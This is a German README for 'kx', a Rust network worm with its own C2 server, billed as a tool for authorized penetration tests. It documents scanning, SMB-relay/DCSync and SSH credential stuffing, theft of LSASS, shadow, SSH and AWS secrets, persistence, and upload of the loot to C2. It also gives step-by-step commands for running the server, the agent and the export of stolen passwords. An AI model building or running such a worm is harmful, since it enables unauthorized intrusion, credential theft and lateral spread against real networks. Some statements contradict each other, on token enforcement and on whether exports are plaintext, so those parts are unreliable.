# kx — Netzwerkwurm für autorisierte Penetrationstests

> **WICHTIG:** Dieses Tool ist ausschließlich für **autorisierte** Penetrationstests
> und Red-Team-Übungen gedacht. Der Einsatz auf Systemen, die dir nicht gehören,
> ohne ausdrückliche Genehmigung, ist **illegal** und kann strafrechtlich verfolgt werden.

## Overview

Kx ist ein modularer, autonomer Netzwerkwurm, geschrieben in Rust. Er durchläuft einen
vollständigen Angriffspfad:

1. **Entdeckung** — findet lebende Hosts im Netz (ARP-Sweep) [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md)
2. **Scan** — ermittelt offene Ports und Dienste [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md)
3. **Exploit** — kompromittiert erreichbare Systeme (SMB-Relay, Credential-Stuffing) [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md)
4. **Extraktion** — holt Passwörter, Hashes und Keys vom eroberten Host [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md), [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md)
5. **Persistenz** — installiert sich dauerhaft (Windows-Dienst, systemd, Cron) [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md), [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md)
6. **Reporting** — meldet alles an eine zentrale C2-Steuerung [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md)

Das Projekt ist ein Cargo-Workspace mit neun Crates unter [`crates/`](./crates/README.md).
Der Angriffspfad folgt der Kette Scanner → Exploit → Post-Exploitation → C2-Report;
`kx-agent` ist der einzige Crate, der alle Fachbereiche zusammenbindet.

> **Die Verschlüsselung der Beute:** Das Modul `kx-core/src/hostkey.rs` ist aktiv
> und übersetzt den Master-Key je Host gegen den öffentlichen Schlüssel des
> Operators (X25519, wahlweise hybrid mit ML-KEM-768). Der Agent bekommt den
> öffentlichen Schlüssel über `--server-key`; ohne diese Option läuft er ohne
> Schlüsselmaterial. Den geheimen Schlüssel erzeugt der Operator mit
> `cargo run -p kx-core --example gen_server_key -- hybrid server_key.json server_pub.json`
> [`crates/kx-core/src/README.md`](./crates/kx-core/src/README.md).

## Subdirectories & Boundaries

- [crates](./crates/README.md) — Die neun Member-Crates des Workspace: Basislagen (`kx-core`, `kx-scanner`), Infrastruktur (`kx-tls`), Post-Exploitation (`kx-win`, `kx-posix`, `kx-exploit`) und die drei Binaries (`kx-server`, `kx-agent`, `kx-cli`).
- [docs](./docs/00-recherche-phase0.md) — Recherchedokumentation zur Phase 0 im Workspace-Root `kx/docs/`. Kein Quellcode, kein EGM-Vertrag.
- [HANDOFF.md](./HANDOFF.md) — Übergabenotiz zum aktuellen Arbeitsstand im Workspace-Root `kx/`. Kein Quellcode, kein EGM-Vertrag.

## Architecture

```
┌─────────────┐   TLS/JSON    ┌─────────────┐
│  kx-cli     │──────────────▶│  kx-server  │
│ (Operator)  │  Bearer-Token │  (C2-Backend)│
└─────────────┘               └──────┬──────┘
                                      │ SQLite
                                      ▼
                               ┌─────────────┐
                               │  Datenbank   │
                               └─────────────┘
        Netzwerk (autorisiert)
┌─────────────┐   ARP/TCP    ┌─────────────┐
│  kx-agent   │──────────────▶│  Zielsystem  │
│ (Wurm)      │  Exploit      │ (Windows/POSIX)│
└──────┬──────┘               └─────────────┘
       │ Secrets/Persistenz
       ▼
  kx-win / kx-posix
```

### Die 9 Crates

| Crate       | Aufgabe                                              |
|-------------|------------------------------------------------------|
| `kx-core`   | KXENC-Dateiformat, Fehlerklassifikation, C2-Protokoll, Hilfsfunktionen, Hybrid-KEM (`hostkey`) |
| `kx-scanner`| ARP-Hostentdeckung, TCP-Portscan                    |
| `kx-exploit`| SMB-Relay, Credential-Stuffing                   |
| `kx-win`    | Windows-Secrets (LSASS, Credential Manager) + Persistenz |
| `kx-posix`  | POSIX-Secrets (/etc/shadow, SSH, AWS) + systemd/Cron|
| `kx-tls`    | Selbstsignierte Zertifikate, rustls-Konfiguration   |
| `kx-server` | C2-Backend: axum-API, SQLite, Dashboard             |
| `kx-agent`  | Der autonome Wurm: orchestriert Scan→Exploit→Report |
| `kx-cli`    | Operator-Oberfläche zum Abfragen/Exportieren        |

## Interface

### Binaries

- `kx-server` — C2-Backend. CLI-Flags: `--host` (Default `127.0.0.1`), `--port` (Default `8443`), `--db` (Default `kx.db`), `--token` (Env `KX_SERVER_TOKEN`), `--cn` (Default `kx.local`) [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).
- `kx-agent` — Autonomer Wurm. CLI-Flags: `--server` (Env `KX_C2_URL`), `--token` (Env `KX_C2_TOKEN`), `--server-cert`, `--server-key`, `--iface` (Default `eth0`), `--start`, `--end`, `--own-ip` (Default `192.168.1.100`), `--hosts`, `--relay-script` (Default `smbrelayx.py`) [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
- `kx-cli` — Operator-CLI. Globale Flags `--server` (Env `KX_C2_URL`), `--token` (Env `KX_C2_TOKEN`), `--cert`; Subcommands `hosts`, `secrets` (mit `--user`), `export` (mit `--format json|csv`), `tasks` [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).

### API-Routen des C2-Servers

| Route                | Methode | Handler          | Effekt                                    |
|----------------------|---------|------------------|-------------------------------------------|
| `/`                  | GET     | `dashboard`      | Statisches HTML-Dashboard                 |
| `/api/register`      | POST    | `register`       | Host registrieren (Upsert auf `id`)       |
| `/api/heartbeat`     | POST    | `heartbeat`      | `last_seen` eines Hosts erneuern          |
| `/api/secrets`       | POST    | `upload_secret`  | Secret hochladen                          |
| `/api/hosts`         | GET     | `list_hosts`     | Alle Hosts                                |
| `/api/secrets`       | GET     | `list_secrets`   | Alle Secrets                              |
| `/api/tasks`         | GET     | `list_tasks`     | Alle Tasks                                |

### Bibliotheken

- `kx-core` — Fehlerklassifikation (`Error`, `ErrorClass`), KXENC-v1-Dateiformat (`Footer`, `FooterFlags`, `CipherId`, `KexId`, `plan_ranges`, `chunk_iter`, `nonce_for`, `aad_for`) und plattformneutrale Hilfsfunktionen (`util`) [`crates/kx-core/src/README.md`](./crates/kx-core/src/README.md).
- `kx-scanner` — `arp_sweep`, `scan_tcp`, `fingerprint` [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md).
- `kx-exploit` — `smb_relay_dcsync`, `try_default_credentials`, `validate_payload` [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
- `kx-win` — `extract_lsass`, `extract_credential_manager`, `extract_browser_credentials`, `create_scheduled_task`, `create_registry_run_key`, `install_service`, `start_service` [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md).
- `kx-posix` — `extract_shadow_hashes`, `extract_ssh_keys`, `extract_aws_credentials`, `install_systemd_service`, `write_cron_persistence` [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md).
- `kx-tls` — `generate_server_tls`, `client_config_trusting` [`crates/kx-tls/src/README.md`](./crates/kx-tls/src/README.md).

## Invariants

- Der Workspace löst mit `resolver = "2"`, Edition 2021 und MSRV 1.77; jedes Crate erbt Version, Edition, MSRV und Lizenz aus dem Workspace-Paketblock [`Cargo.toml`](./Cargo.toml). `authors` erben nur acht der neun Crates — `kx-core` nicht.
- Interne Crate-Abhängigkeiten sind ausschließlich `path`-Dependencies; keine Registry-Version der eigenen Crates wird verwendet [`Cargo.toml`](./Cargo.toml).
- `ml-kem` ist im Workspace-Manifest auf `=0.2.3` festgenagelt; ein Wechsel auf 0.3.x würde `rand_core` auf 0.10 heben und damit `x25519-dalek 2` und `rand 0.8` brechen [`Cargo.toml`](./Cargo.toml). `kx-core` bezieht die Dependency über `workspace = true` — es gibt damit genau **eine** Stelle, an der die Version steht, und der Pin kann nicht mehr umgangen werden. `=0.2.1` wäre auch kein gutes Ziel: diese Version verlangt `kem` per Caret, lässt `kem` 0.3.0 zu und zieht damit `rand_core` 0.10.1 neben die 0.6.4 des Workspaces — der Build bricht. 0.2.3 pinnt `kem` exakt auf `=0.3.0-pre.0` und hält genau eine `rand_core`-Version im Lockfile [`../.scratch/c2-operability/issues/ISSUE-8-ml-kem-pin-umgangen.md`](../.scratch/c2-operability/issues/ISSUE-8-ml-kem-pin-umgangen.md).
- `panic = "unwind"` bleibt im Release-Profil aktiv, weil der Encoder pro Datei einen Panic abfangen muss [`Cargo.toml`](./Cargo.toml).
- Die Schichtung der Crates ist strikt: `kx-core` und `kx-scanner` sind Basislagen ohne interne Crate-Abhängigkeit [`crates/README.md`](./crates/README.md).
- `kx-win` und `kx-posix` kapseln jeden externen Effekt hinter einem `cfg(target_os = "windows")`- bzw. `#[cfg(unix)]`-Paar; die Stubs auf der Nicht-Zielplattform sind wirkungslos [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md), [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md).
- **`kx-tls` erzeugt ausschließlich selbstsignierte Zertifikate ohne CA-Kette**; der Client-Trust-Store bleibt leer und enthält nur die übergebenen PEM-Zertifikate, es wird kein System-Trust-Store geladen [`crates/kx-tls/src/README.md`](./crates/kx-tls/src/README.md).
- **Die API-Routen des C2-Servers prüfen das Bearer-Token per Middleware.** Die fünf Vertragspfade hängen an einem eigenen API-Router mit `route_layer(require_auth)`; der Vergleich ist constant-time. `GET /` (Dashboard-HTML) und `POST /api/login` stehen daneben — der Login-Pfad prüft das Token, das er entgegennimmt [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md), [`crates/kx-server/src/auth.rs`](./crates/kx-server/src/auth.rs).
- **Das Dashboard escaped jeden API-Wert** und nimmt das Token über ein Login-Formular, nicht aus dem Query-String. Ohne Escaping wird ein im `hostname` enthaltenes `<img src=x onerror=…>` zu ausführbarem Markup im Browser des Operators [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).
- **Der Server schreibt keine Zertifikatsdatei.** `generate_server_tls` liefert Zertifikat und Schlüssel im Speicher, die direkt an `RustlsConfig::from_pem` gehen; ein `kx-server.crt`/`kx-server.key` entsteht nicht [`crates/kx-server/src/main.rs`](./crates/kx-server/src/main.rs).
- Der CLI-Export schreibt Passwörter im Klartext — JSON serialisiert alle Felder, CSV die Spalten `host_id,cred_type,username,password,source,collected_at` ohne `id` [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).
- Der WMI-/WinRM-Ausführungspfad wurde entfernt: das Flag `--wmi-script`, der Parameter in `run_propagation` und das Modul `wmi_exec` existieren nicht mehr [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
- `try_default_credentials` führt für den Dienst `ssh` einen echten Authentifizierungsversuch durch (`sshpass`), für andere Dienste nicht; jeder Versuch steht unter einer Zeitgrenze [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
- Die Host-ID des Agenten ist die eigene IP (`own_ip.to_string()`), nicht die Prozess-ID [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
- `PropagationResults` trägt nur noch `new_hosts` und `new_secrets`; ein `source_host`-Feld existiert nicht mehr [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
- **Der SMB-Relay-Pfad des Agenten braucht Impacket auf dem Agentenhost.** Das Relay-Skript liegt als Asset im Repository (`assets/smbrelayx.py`), der Domaincontroller muss Port 445 offen haben und auf dem Ziel muss Mimikatz liegen [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md), [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md).

## Side Effects

- **Netzwerk (Lokal):** ARP-Sweeps auf Layer 2 über `AF_PACKET`-Raw-Sockets und parallele TCP-Connect-Scans [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md). Banner-Grabs bis 1024 Byte führt nur das Beispiel-Binary `kx-exploit/examples/demo_worm.rs` aus, nicht der Agent.
- **Netzwerk (Remote):** SMB-Relay→DCSync läuft als `python3`-Subprozess gegen das mitgelieferte Impacket-Skript `assets/smbrelayx.py` [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
- **Netzwerk (C2):** Agent und CLI sprechen den C2-Server über TLS an; der Agent meldet Hosts und Secrets per POST an `/api/register` und `/api/secrets` [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md), [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).
- **Prozesse auf Zielsystemen:** `powershell.exe`, `mimikatz.exe`, `cmd.exe`, `sc.exe`, `cmdkey.exe`, `schtasks`, `reg add` auf Windows; `systemctl` und `crontab` auf POSIX [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md), [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md).
- **Dateisystem auf Zielsystemen:** Anlegen von systemd-Units unter `/etc/systemd/system/`, Mutieren der Crontab des aufrufenden Users, Registry-Run-Keys und Scheduled Tasks unter Windows [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md), [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md).
- **Persistenz (Zentral):** Der C2-Server legt die SQLite-Datenbank unter dem `--db`-Pfad an und führt das DDL `CREATE TABLE IF NOT EXISTS` für `hosts`, `secrets` und `tasks` aus [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md). Die Tabelle `tasks` wird befüllt: der Operator legt über `POST /api/tasks/new` eine Aufgabe an, der Agent holt sie über `GET /api/tasks`, führt sie aus und meldet das Ergebnis über `POST /api/tasks/result` zurück. Die Tabelle `secrets` bekommt bei wiederholtem Upload desselben Secrets die Zeile aktualisiert, keine neue (Upsert auf `host_id`, `cred_type`, `username`, `source`).
- **Dateisystem (Export):** Der CLI-Export legt die Exportdatei an oder überschreibt sie (Mode 0600) und schreibt die Secrets als Chiffretext in der Spalte `sealed_password` — der Klartext bleibt im C2 verworfen und wird nur mit `kx-cli secrets --decrypt` geholt [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).
- **Schlüsselmaterial:** `kx-tls` erzeugt bei jedem Aufruf einen frischen Schlüssel aus dem OS-RNG und exponiert den privaten Schlüssel im Klartext-PEM [`crates/kx-tls/src/README.md`](./crates/kx-tls/src/README.md).
- **Protokollierung:** Das Beispiel-Binary `kx-exploit/examples/demo_worm.rs` schreibt erkannte NT-Hashes und Benutzername/Passwort-Paare im Klartext nach stdout; der Agent selbst loggt nur Zählwerte. `kx-win` loggt den Benutzernamen pro extrahiertem LSASS-Credential [`crates/kx-exploit/examples/README.md`](./crates/kx-exploit/examples/README.md), [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md).

## Verification

- Run: `cargo test` (ausgeführt in der Workspace-Wurzel `/Volumes/T7/Projekte/testwurm/kx`)
- **Plattformhinweis:** `kx-scanner/src/arp.rs` verwendet Linux-only-libc-Symbole (`AF_PACKET`, `ETH_P_ARP`, `ARPHRD_ETHER`, `PACKET_BROADCAST`, `SIOCGIFINDEX`, `ifr.ifr_ifru.ifru_ifindex`), ist aber vollständig mit `#[cfg(target_os = "linux")]` ausgezeichnet. Der Workspace baut und testet damit plattformübergreifend; **nur** der ARP-Sweep steht exklusiv unter Linux zur Verfügung [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md).
- Stand (2026-11-11, macOS-Host): `cargo test --workspace` → **59 Tests grün, 0 Fehler**.
- **`kx-server` startet wieder.** Die rustls-`CryptoProvider`-Auflösung war mehrdeutig (`aws-lc-rs` via `axum-server/tls-rustls` plus `ring` aus dem Workspace-Feature); das Feature ist jetzt auf `tls-rustls-no-provider` umgestellt, `aws-lc-rs` verschwindet damit aus dem Lockfile, und `kx-tls::install_crypto_provider()` setzt den Provider explizit. Der Start-Smoke-Test läuft durch [`crates/kx-tls/src/README.md`](./crates/kx-tls/src/README.md).

## Voraussetzungen

### 1. Rust-Toolchain installieren
```bash
# rustup installieren (falls nicht vorhanden)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
# PATH setzen (oder neu anmelden)
export PATH="$HOME/.cargo/bin:$PATH"
# Prüfen
rustc --version   # sollte >= 1.77 sein
cargo --version
```

### 2. Externe Exploit-Tools (optional, für reale Exploits)

Kx nutzt **Impacket** für das SMB-Relay. Es muss separat
installiert sein:

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install -r requirements.txt
```

Der Pfad zu `smbrelayx.py` wird dem Agent übergeben (siehe unten). Ohne dieses
Tool läuft der Agent nur im Scan-Modus. Der frühere WMI-Angriffspfad wurde
entfernt — es gibt nur noch das SMB-Relay [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).

### 3. Linux-Sysdeps (für ARP-Scan)

Der ARP-Sweep nutzt rohe `AF_PACKET`-Sockets über die `libc`-Crate — **kein
libpcap**. Zusätzliche Systembibliotheken sind nicht nötig; erforderlich sind
`CAP_NET_RAW` oder Root-Rechte sowie ein Linux-Kernel:

```bash
# Rechte prüfen (Root oder CAP_NET_RAW)
sudo setcap cap_net_raw+ep ./target/release/kx-agent
```

Der ARP-Sweep existiert nur unter Linux (`#[cfg(target_os = "linux")]`); alle
übrigen Crates sind plattformübergreifend baubar.

## Build

```bash
cd kx
# Debug-Build (schnell, für Entwicklung)
cargo build
# Release-Build (optimiert, für Produktivbetrieb)
cargo build --release
# Tests ausführen
cargo test
```

Nach dem Build liegen die Binaries in `target/debug/` (bzw. `target/release/`):
- `kx-server` — der C2-Backend-Server
- `kx-agent` — der autonome Wurm
- `kx-cli` — die Operator-Oberfläche
- `kx-core` — Bibliothek (kein Binary)

## Schritt-für-Schritt-Nutzung

### Schritt 1: C2-Server starten

Der Server erzeugt automatisch ein selbstsigniertes TLS-Zertifikat und eine
SQLite-Datenbank. Starte ihn auf einem zentralen Rechner:

```bash
# Mit festem Token (empfohlen)
./target/debug/kx-server \
  --host 0.0.0.0 \
  --port 8443 \
  --db /tmp/kx.db \
  --token mein_geheimes_token \
  --cn kx.local
```

**Output:**
```
Kx-Server lauscht auf https://0.0.0.0:8443
API-Endpunkte:
  POST /api/register   Host registrieren
  POST /api/heartbeat  Host-Heartbeat senden
  POST /api/secrets    Secret hochladen
  GET  /api/hosts      Alle Hosts
  GET  /api/secrets    Alle Secrets
  GET  /api/tasks      Alle Tasks
```

> **Hinweis:** Das selbstsignierte Zertifikat wird **nicht** in `kx-server.crt` /
> `kx-server.key` geschrieben — der Server hält Zertifikat und Schlüssel nur im
> Speicher und gibt sie an die TLS-Konfiguration. Für `--server-cert` (Agent) und
> `--cert` (CLI) musst du das PEM separat bereitstellen; der Server liefert es
> nicht aus [`crates/kx-server/src/main.rs`](./crates/kx-server/src/main.rs).
>
> **Hinweis:** Wenn kein Token gesetzt wird, erzeugt der Server ein zufälliges
> (UUID v4) und schreibt es nach stderr. Die API-Routen prüfen das Token
> aktuell jedoch **nicht** — `Authenticated` wird von keinem Handler verwendet
> [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).

### Schritt 2: Agent (Wurm) ausführen

Der Agent läuft auf einem bereits kompromittierten oder testbaren System und
propagiert sich ins Netzwerk. Er braucht das Server-Zertifikat-Pfad:

```bash
./target/debug/kx-agent \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --server-cert /pfad/zu/kx-server.crt \
  --iface eth0 \
  --start 192.168.1.1 \
  --end 192.168.1.254 \
  --own-ip 192.168.1.10 \
  --relay-script assets/smbrelayx.py \
```

Der Agent durchläuft folgende Schritte — die lokale Phase läuft **vor** der Netzwerkphase:

0. Sich selbst beim C2-Server registrieren (eigene IP als Host-ID, Status `"agent"`) — sonst zeigen die lokal erbeuteten Secrets auf einen dem Server unbekannten Host
1. Lokale Secrets extrahieren (Windows: LSASS + Credential Manager; POSIX: Shadow + AWS) und zum C2-Server hochladen
2. systemd- bzw. Windows-Dienst-Persistenz installieren
3. Den ARP-Sweep auf `eth0` im Bereich `192.168.1.1`–`192.168.1.254` ausführen
4. Offene Ports scannen
5. Windows-Systeme per SMB-Relay angreifen (nur Port 445 — braucht Impacket auf dem Agentenhost und Mimikatz auf dem Ziel)
6. SSH-Systeme mit Default-Credentials testen (erfordert `sshpass` auf dem Agentenhost)
7. Alle Ergebnisse an den C2-Server melden

> **Bekannte Funktionsdefekte:** Schritt 5 ist derzeit wirkungslos. Die unter
> Linux installierte systemd-Unit ist ein Einmal-Lauf (`Type=oneshot`,
> `Restart=no`) — den Takt gibt der Timer `kx-agent.timer` (alle fünf
> Minuten). Dreizehn solcher Defekte sind als Issues unter
> `.scratch/c2-operability/issues/` erfasst, der Ablaufplan in
> `.scratch/c2-operability/EPIC.md`, der Design-Entwurf zur Behebung in
> `.scratch/c2-operability/design_draft.md`.

### Schritt 3: Ergebnisse mit der CLI abfragen

Von einem Operator-Rechner aus:

```bash
# Alle erkannten Hosts anzeigen
./target/debug/kx-cli \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --cert /pfad/zu/kx-server.crt \
  hosts
# Alle Secrets anzeigen (optional gefiltert)
./target/debug/kx-cli \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --cert /pfad/zu/kx-server.crt \
  secrets --user admin
# Secrets als CSV exportieren
./target/debug/kx-cli \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --cert /pfad/zu/kx-server.crt \
  export /tmp/erbeute.csv --format csv
```

### Schritt 4: Dashboard im Browser

Öffne im Browser: `https://<server-ip>:8443/`

Das Dashboard fragt das Token über ein Login-Formular entgegen (`POST
/api/login`) — es steht **nicht** im Query-String und landet damit weder in
der Browser-Historie noch in den Server-Logs (ISSUE-13). Nach der Anmeldung
zeigt es Hosts, Secrets und Tasks live an.

## Konfigurationsreferenz

### kx-server

| Option | Beschreibung | Standard |
|--------|--------------|----------|
| `--host` | Bind-Adresse | `127.0.0.1` |
| `--port` | Port | `8443` |
| `--db` | SQLite-Pfad | `kx.db` |
| `--token` | Bearer-Token (oder `KX_SERVER_TOKEN`) | zufällig |
| `--cn` | Zertifikat-CN | `kx.local` |

### kx-agent

| Option | Beschreibung | Standard |
|--------|--------------|----------|
| `--server` | C2-URL (oder `KX_C2_URL`) | — |
| `--token` | Bearer-Token (oder `KX_C2_TOKEN`) | — |
| `--server-cert` | Server-Zertifikat (PEM) | — |
| `--iface` | Netzwerk-Interface | `eth0` |
| `--start`/`--end` | Scan-Bereich (**Pflichtargumente**, ohne Default) | — |
| `--own-ip` | Eigene IP | `192.168.1.100` |
| `--hosts` | Host-Liste (umgeht ARP) | — |
| `--relay-script` | smbrelayx.py-Pfad | `assets/smbrelayx.py` |

### kx-cli

| Option | Beschreibung |
|--------|--------------|
| `--server` | C2-URL |
| `--token` | Bearer-Token |
| `--cert` | Server-Zertifikat (PEM) |
| `--format` | Exportformat der Subcommand `export` (`json` oder `csv`) | `json` |
| `hosts`/`secrets`/`tasks`/`export` | Subcommands |

## Sicherheitshinweise

- **Nur autorisierte Netzwerke!** Kein Einsatz ohne schriftliche Genehmigung.
- **Token schützen:** Das Bearer-Token ist der Zugriffsschlüssel für Agent und CLI. Der C2-Server **erzwingt es jetzt**: die fünf Vertragspfade sind per Middleware geschützt, ohne oder mit falschem Token kommt HTTP 401. Das Token wird weder im Query-String noch im stderr ausgegeben, und der systemd-Agent bekommt es über eine Environment-Datei mit 0600. Wer den Server im Netz betreibt, sollte den Port zusätzlich durch Firewall oder Reverse-Proxy absichern — die Beute enthält Klartext-Passwörter und NT-Hashes [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).
- **Dashboard escaped die API-Werte:** jeder Wert läuft vor dem Einsetzen in die Tabelle durch einen Escape-Helper, damit ein vom Zielsystem kontrollierter Hostname kein ausführbares Markup wird. Das Token nimmt das Dashboard über ein Login-Formular entgegen, nicht aus der URL [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).
- **TLS:** Der Server nutzt selbstsignierte Zertifikate; Client-Seite muss das Zertifikat explizit vertrauen.
- **Persistenz entfernen:** Nach dem Test die installierten Dienste/Cron-Jobs manuell entfernen.
- **Klartext in Logs und Exporten:** NT-Hashes und Passwörter landen im stdout des Agenten und im CLI-Export. Beide Artefakte nach dem Test löschen.

## Troubleshooting

| Problem | Lösung |
|---------|--------|
| `cargo: command not found` | `export PATH="$HOME/.cargo/bin:$PATH"` |
| ARP-Sweep fehlerhaft | Interface prüfen, Root-Rechte sicherstellen, Linux erforderlich |
| Build bricht mit `AF_PACKET` / `SIOCGIFINDEX` ab | Auf macOS/Windows nicht unterstützt — auf Linux bauen oder `kx-scanner` aus dem Build nehmen |
| SMB-Relay schlägt fehl | Impacket installiert? Ziel-System Windows? |
| TLS-Fehler beim Agent | Korrektes `--server-cert` übergeben (der Server schreibt keine PEM-Datei) |
| `Database is locked` | Nur eine Server-Instanz pro DB-Datei |

## Lizenz & Haftung

Dieses Werkzeug ist für **legitime Sicherheitsforschung** gedacht. Der Autor
übernimmt keine Haftung für missbräuchliche Verwendung. Du allein bist
verantwortlich, sicherzustellen, dass dein Einsatz legal ist.
